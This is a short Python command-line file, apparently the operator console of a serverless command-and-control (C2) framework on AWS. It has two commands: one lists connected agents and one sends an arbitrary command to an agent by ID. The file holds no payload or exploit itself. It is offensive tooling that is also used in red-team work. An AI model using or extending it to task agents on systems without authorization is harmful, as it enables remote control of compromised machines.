import click
import aws_commands
import formatter


@click.group()
def cli():
    # --- Command line interface for the C2 Serverless Framework ---
    pass


@cli.command()
def agents():
    print("Searching for agents...")
    agents_list = aws_commands.list_agents()
    formatter.print_agents_table(agents_list)


@cli.command()
@click.argument("agent_id")
@click.argument("command")
def task(agent_id, command):
    aws_commands.send_task_to_agent(agent_id, command)


if __name__ == "__main__":
    cli()
